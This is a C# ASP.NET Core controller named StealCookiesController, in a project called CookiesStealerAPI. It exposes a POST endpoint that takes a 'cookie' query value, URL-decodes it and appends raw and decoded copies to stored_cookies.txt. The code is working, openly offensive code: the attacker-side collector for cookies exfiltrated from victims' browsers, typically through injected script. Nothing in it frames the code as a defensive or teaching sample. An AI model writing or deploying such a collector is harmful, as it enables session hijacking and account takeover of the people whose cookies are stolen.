using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace CookiesStealerAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class  StealCookiesController: ControllerBase
    {
        public StealCookiesController() { }


        [HttpPost]
        public IActionResult PostStolenCookie([FromQuery(Name = "cookie")] string encodedCookieValue)
        {

            if (string.IsNullOrEmpty(encodedCookieValue))
            {
                return BadRequest("No cookie provided.");
            }

            // Optionally decode if you want to store it in a readable format
            string decodedCookieValue = System.Net.WebUtility.UrlDecode(encodedCookieValue);

            // Store the raw encoded cookie value
            StoreInFile("Raw: " + encodedCookieValue);
            // Store the decoded cookie value
            StoreInFile("Decoded: " + decodedCookieValue);

            return Ok("Cookie stored successfully.");
        }

        private void StoreInFile(string cookieValue)
        {
            // Specify the path to your file
            string filePath = "stored_cookies.txt";
            // Using 'true' for appending data to the file
            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine(cookieValue);
            }
        }
    }
}
